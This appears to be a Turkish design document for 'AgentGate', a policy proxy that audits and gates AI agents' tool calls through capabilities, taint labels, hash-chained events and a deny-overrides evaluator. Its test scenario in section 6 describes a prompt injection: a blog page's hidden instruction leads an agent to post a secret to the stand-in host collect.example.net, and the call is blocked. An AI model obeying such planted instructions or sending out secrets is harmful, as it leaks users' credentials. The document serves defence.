# AgentGate — Veri Modeli ve Sözleşmeler

Bu doküman, kodun üzerine yazılacağı sözleşmeleri tanımlar. **Şemalar değişmeden uygulama kodu yazılmaz.** Bir alanı değiştirmek istiyorsan önce bu dosyayı ve ilgili JSON Schema'yı değiştir, sonra testi.

```
docs/
├── data-model.md                 ← bu dosya (açıklama + invariants)
└── schemas/
    ├── capability.schema.json    ← tek yetenek
    ├── taint.schema.json         ← provenance / güven etiketi
    ├── event.schema.json         ← denetim kaydı birimi
    ├── manifest.schema.json      ← inspector çıktısı
    └── policy.schema.json        ← politika DSL'i
policies/
    ├── default-deny.yaml
    ├── readonly-research.yaml
    ├── coding-agent.yaml
    └── inspect-suggested.example.yaml
```

Şemalar [JSON Schema 2020-12](https://json-schema.org/draft/2020-12) ile yazıldı; Pydantic modelleri bunlardan üretilecek (`datamodel-code-generator`) ve testlerde şemaya karşı doğrulama yapılacak. Tek doğruluk kaynağı şemalardır.

---

## 1. Capability — yeteneğin dili

Bir araç "ne yapabiliyor" sorusunun cevabı. Aynı nesne üç yerde kullanılır:

| Üretildiği yer | Nasıl |
|---|---|
| Statik analiz | koddan çıkarılan `declared` |
| Sandbox | sensörlerden çıkarılan `observed` |
| Proxy | çalışma anında çağrıdan çıkarılan |

`kind` sınıfları ve `target` semantiği:

| kind | target | Örnek |
|---|---|---|
| `fs.read` | glob yol | `/home/u/proje/**` |
| `fs.write` | glob yol | `/home/u/proje/dist/**` |
| `net.egress` | `host[:port]` | `api.openweathermap.org:443` |
| `net.listen` | `host:port` | `127.0.0.1:8080` |
| `proc.exec` | komut adı | `git` |
| `env.read` | değişken adı | `OPENAI_API_KEY` |
| `secret.read` | sır sınıfı | `aws.credentials` |
| `llm.call` | sağlayıcı | `anthropic` |
| `clipboard` | `read` / `write` | `read` |
| `ipc` | soket / pipe adı | `unix:/tmp/agent.sock` |

**Kural:** `target` normalize edilmeden karşılaştırılmaz. Yollar `realpath` + workspace köküne göre, host'lar küçük harf + port dahil, komutlar basename olarak normalize edilir. Bu normalizasyon `core/normalize.py` içinde tek bir yerde yaşar.

---

## 2. Taint — içeriğin nereden geldiği

İki nesne var:

- **`ContextSegment`**: proxy'nin gördüğü ve etiketlediği içerik parçası (fetch edilen sayfa, dosya içeriği, araç çıktısı). Ham içerik **saklanmaz**; yalnızca `content_sha256` ve eşleştirme için normalize edilmiş n-gram indeksi tutulur.
- **`TaintRef`**: bir tool çağrısının argümanının hangi segment(ler)den türediği. `match` alanı tespitin nasıl yapıldığını söyler: `exact` (birebir alt dize), `shingle` (8 token'lık n-gram örtüşmesi), `embedding` (v2).

Güven etiketleri: `user`, `system`, `tool`, `untrusted_web`, `file`.

**Neden iki katman?** Modelin içini göremiyoruz; taint ancak yaklaşık hesaplanabilir. Bu yüzden:

- **Katman A (IFC kapısı):** oturumda bir kez `untrusted_web` varsa, yüksek riskli yetenek sınıfları provenance'dan bağımsız olarak kısıtlanır. Sağlam taraf budur.
- **Katman B (provenance):** argüman–segment eşleşmesi. Açıklanabilirlik ve UI zinciri için. Yanlış negatif verebilir; README'de ölçülür.

`session.tainted_with` politika yüklemi **yalnızca Katman A**'yı okur — yani güvenilir, ucuz ve deterministik.

---

## 3. Event — denetim kaydı

Tek bir olay tipi ailesi:

| type | Ne taşır |
|---|---|
| `tool_call` | `tool`, `args`, `capability`, `provenance`, `risk` |
| `tool_result` | `tool`, `payload.output_sha256`, süre |
| `context_inject` | `payload` içinde `ContextSegment` |
| `approval` | `payload.approved` (bool), `payload.channel`, `payload.by` |
| `policy_decision` | `decision`, `rule_id`, `reason`, `risk` |
| `finding` | inspector veya runtime bulgusu |

**Zincir alanları:** `seq` oturum içi monotonik; `prev_hash` önceki olayın `hash`'i; `hash = sha256(canonical_json(olay \ {hash}) + prev_hash)`. İlk olayda `prev_hash = null`. Store bu alanları yazar; çağıran taraf doldurmaz.

**Nedensellik:** `parent_id`, olayı tetikleyen olayı gösterir. Kural: her `policy_decision`, aynı oturumda kendisinden önceki bir `tool_call`'a bağlanır; her `tool_result`, kendi `tool_call`'ına.

**Redaksiyon:** `args` ve `payload` yazılmadan önce `policies/*.yaml` içindeki `redact_patterns` uygulanır. Denetim kaydına sır yazmak, projenin kendisini veri sızıntısı aracına çevirir.

---

## 4. Manifest — inspector'ın çıktısı

`declared` (statik) ile `observed` (sandbox) farkı `undeclared`'dır; asıl bulgu sinyali budur. Her fark ayrıca bir `Finding` üretir:

```json
{
  "id": "F-3",
  "severity": "critical",
  "title": "Bildirilmemiş kimlik bilgisi erişimi",
  "description": "Sunucu ~/.aws/credentials dosyasını açmaya çalıştı.",
  "capability": { "kind": "secret.read", "target": "aws.credentials" },
  "evidence": ["01J8Z4Q2M9X7K3V5N1P8R6T4W8"]
}
```

`confidence`, probe kapsamına ve sensör kalitesine bağlıdır. Düşük güven **gizlenmez**; UI'da sarı gösterilir. Sahte kesinlik, güvenlik aracında en büyük kusurdur.

---

## 5. Politika değerlendirme algoritması

Deterministik, yan etkisiz, fail-closed. **`constrain` bir karar değil, bir değiştiricidir** — yetki vermez, var olan `allow`/`approve` kararına kısıt ekler. Bu ayrım olmadan "çıktıyı redakte et" kuralı, yetkilendirme kurallarını gölgeleyip her şeyi belirsiz bir duruma sokar.

```python
def evaluate(ctx, policy):
    matched = [r for r in policy.rules if eval_condition(r.when, ctx)]

    auth = [r for r in matched if r.then in ("allow", "deny", "approve")]
    constraints = [r.action for r in matched if r.then == "constrain" and r.action]

    if not auth:
        return Decision(policy.defaults.decision,
                        rule_id=f"default:{policy.defaults.decision}",
                        constraints=[])

    # deny > approve > allow
    for d in ("deny", "approve", "allow"):
        hits = sorted((r for r in auth if r.then == d), key=lambda r: r.id)
        if hits:
            r = hits[0]
            return Decision(d, rule_id=r.id, reason=r.reason,
                            constraints=constraints if d != "deny" else [])

    return Decision("deny", rule_id="default:unreachable")  # ulaşılamaz
```

**Neden `deny` kazanırken kısıt yok?** Reddedilen çağrı çalışmaz; kısıt uygulanacak bir çıktı da yoktur.

**Allowlist deseni:** deny-overrides kullandığımız için "şunun dışındaki her şeyi reddet" kuralı istisnayı açıkça taşımalıdır:

```yaml
- id: deny-unlisted-shell
  when:
    all:
      - capability: proc.exec
      - not: { command.in_allowlist: true }
  then: deny
```

İlk sürümde bu `not` unutuldu ve allowlist kuralı deny tarafından gölgelendi — testler yakaladı. Bu, deny-overrides modelinin bilinen maliyetidir; karşılığında politika okunabilir ve fail-closed kalır.

- `all` / `any` / `not` kısa devre yapar; değerlendirme sırası dosyadaki sıradır.
- Yüklenemeyen politika (bilinmeyen yüklem, şema hatası) **çalıştırılmaz**; proxy başlamaz.
- **İstisna:** politika değerlendirmesi hata fırlatırsa `defaults.on_error` uygulanır (varsayılan `deny`).
- Değişkenler (`${workspace}`) politika yüklenirken çözülür ve çözülmüş hali denetim kaydına yazılır.

---

## 6. Örnek oturum (test fixture'ı olarak kullan)

Senaryo: ajan bir blog yazısını okur, sayfadaki gizli talimat gereği sır göndermeye çalışır.

| seq | type | İçerik | Sonuç |
|---|---|---|---|
| 1 | `context_inject` | kullanıcı isteği (trust=`user`) | — |
| 2 | `tool_call` | `fetch(url=blog.example.com/post)` → `net.egress` | allow |
| 3 | `tool_result` | sayfa içeriği | — |
| 4 | `context_inject` | sayfa metni (trust=`untrusted_web`) | oturum işaretlenir |
| 5 | `tool_call` | `http.post(collect.example.net, body=canary+secret)` → `net.egress` | **deny** |
| 6 | `policy_decision` | `rule_id=lethal-trifecta`, `risk=88` | — |
| 7 | `finding` | `runtime-egress-blocked` | — |

Bu 7 olay, V1'deki entegrasyon testinin omurgasıdır. Replay testi: aynı 7 olay + aynı politika → birebir aynı kararlar.

---

## 7. Invariants (test edilecek)

| ID | Kural |
|---|---|
| INV-1 | Her `tool_call` bir `capability` taşır. |
| INV-2 | Her `policy_decision` bir `rule_id` taşır ve aynı oturumda bir `tool_call`'a bağlanır. |
| INV-3 | Eşleşen kural yoksa `defaults.decision` uygulanır; varsayılan `deny`. |
| INV-4 | `args`/`payload` diske yazılmadan önce redaksiyon uygulanır. |
| INV-5 | Her olayın `hash`'i bir öncekine bağlıdır; zincir kırılırsa store yüklemeyi reddeder. |
| INV-6 | Oturum içinde `session_id` ve `seq` değişmez, tekrar etmez. |
| INV-7 | `untrusted_web` etiketi yalnızca `context_inject` olayından doğar; ajan kendi kendine üretemez. |
| INV-8 | Replay, aynı olay + aynı politika sürümü için birebir aynı kararları verir. |

---

## 8. Sürümleme

- Şema değişikliği: `$id` URL'si sabit kalır, `version` alanı eklenmez; şemalar geriye dönük uyumlu genişler. Kırıcı değişiklikte yeni dosya (`event.v2.schema.json`) açılır.
- Politika: `version: 1` zorunlu. `rule_id`'ler kararlarda referans verildiği için **asla yeniden kullanılmaz**; kural silinse bile ID emekliye ayrılır.
- Manifest: `inspector_version` + `probe_suite` sürümü birlikte saklanır; aynı artefakt iki farklı sürümle karşılaştırılabilir.

---

## 9. Kodlama sırası (bu dokümandan sonra)

1. `core/schemas.py` — JSON Schema'lardan üretilen Pydantic modelleri + `validate_*` yardımcıları.
2. `core/normalize.py` — capability normalizasyonu (yol, host, komut).
3. `core/policy.py` — `load_policy`, `eval_condition`, `evaluate`; önce saf fonksiyon, sonra motor.
4. `tests/test_policy.py` — dört örnek politika + örnek oturum üzerinden kararlar.
5. `core/taint.py` — Katman A (oturum etiketi) ile başla; Katman B'yi sonra ekle.
6. Ancak bundan sonra proxy ve inspector.

V1'in kabul kriteri: §6'daki 7 olaylık senaryo, `default-deny.yaml` ile uçtan uca `deny` üretiyor ve replay aynı sonucu veriyor.
